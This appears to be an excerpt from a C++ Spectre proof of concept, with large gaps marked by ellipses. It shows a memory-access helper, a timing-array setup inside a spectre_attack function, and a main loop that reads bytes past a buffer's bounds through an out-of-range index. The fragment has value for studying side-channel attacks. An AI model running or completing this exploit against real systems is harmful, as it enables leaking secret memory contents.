...
void access_memory(const void* p) {
    __asm__ __volatile__("" : : "r"(*static_cast<const uint8_t*>(p)) : "memory");
}
...
/// @details This function detects which values from latencies have values below some set threshold
/// and increase score at the same index in scores container.
/// @param latencies stores latencies
/// @param scores stores scores of latencies. Value of latency in latencies correspond to score
/// value in scores.
...
char spectre_attack(const char* data, std::size_t size, std::size_t evil_index) {
    constexpr const std::size_t num_val = 256;  // Number of Timing Elements (size might be due to
                                                // fact that we're reading by one byte)
    constexpr const std::size_t timing_element_size = 1024;
    struct TimingElement {
        char s[timing_element_size];
    };                                           // 1KB
...
auto main() -> int {
    ...
    for (size_t byte_index = 0; byte_index < memory_block_size; ++byte_index) {
        const char c =
            spectre_attack(data.data(), strlen(data.data()) + 1, memory_block_size + byte_index);
